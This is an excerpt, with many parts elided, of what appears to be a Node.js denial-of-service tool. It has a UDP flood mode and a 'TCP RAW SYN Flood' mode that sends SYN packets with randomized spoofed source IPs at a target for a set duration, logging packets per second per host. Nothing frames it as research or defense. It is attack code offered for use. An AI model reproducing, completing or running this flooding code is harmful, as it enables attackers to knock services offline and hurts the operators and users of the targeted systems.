...
try {
    ...
    // raw-socket not installed, tcp-raw will not work
}
...
if (method === 'udp') {
    ...
    for(let i = 0; i < threads; i++) {
        ...
        sock.on('error', () => {});
        try { sock.bind(Math.floor(Math.random()*60000)+1024); } catch(e) {}
    ...
    setTimeout(() => {
        ...
        console.log(`[${hostname}] UDP: ${sent} packets | ${(sent/elapsed).toFixed(0)} PPS`);
        process.exit(0);
    }, duration * 1000);
    
} else if (method === 'tcp-raw' && raw) {
    // TCP RAW SYN Flood
    ...
    for(let i = 0; i < threads; i++) {
        ...
        const send = () => {
            const packet = createSynPacket(randomIp(), srcPort, seq);
            socket.send(packet, 0, packet.length, target, () => { sent++; });
    ...
    setTimeout(() => {
        const elapsed = (Date.now() - start) / 1000;
        console.log(`[${hostname}] TCP-RAW: ${sent} SYN packets | ${(sent/elapsed).toFixed(0)} PPS`);
        process.exit(0);
    }, duration * 1000);
    
} else {
    console.log(`[${hostname}] Invalid method or raw-socket not installed`);
    process.exit(1);
}
